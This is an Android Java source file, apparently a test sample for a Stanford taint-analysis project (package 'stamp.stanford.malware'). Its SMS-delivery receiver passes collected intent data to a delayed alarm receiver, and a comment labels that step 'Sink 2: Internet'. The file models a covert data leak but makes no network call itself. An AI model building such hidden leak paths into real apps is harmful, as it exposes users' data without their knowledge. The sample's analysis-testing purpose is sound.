package stamp.stanford.malware;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.widget.Toast;

public class SmsBroadcastReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context ctx, Intent intent) {
		//Automatically trigger the alarm event after 3 sec. 
		int sec = 3;
		String ALARM_SERVICE = Context.ALARM_SERVICE;
		switch (getResultCode()) {
		case Activity.RESULT_OK:
			Toast.makeText(ctx, "SMS delivered successfully.",
					Toast.LENGTH_SHORT).show();
			/* Sink 2: Internet */
			Bundle senseData = intent.getExtras();
		    Intent alarmIntent = new Intent(ctx, AlarmBroadcastReceiver.class);
		    alarmIntent.putExtras(senseData);
			PendingIntent pAlarmIntent = PendingIntent.getBroadcast(
					ctx, 0, alarmIntent, 0);
		    AlarmManager alarmManager = (AlarmManager) ctx.getSystemService(ALARM_SERVICE);
		    alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
		        + (sec * 1000), pAlarmIntent);
			break;
		case SmsManager.RESULT_ERROR_NO_SERVICE:
			Toast.makeText(ctx, "No service, error.", Toast.LENGTH_SHORT)
					.show();
			break;
		case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
			Toast.makeText(ctx, "Generic failure", Toast.LENGTH_SHORT).show();
			break;
		}
	}

}
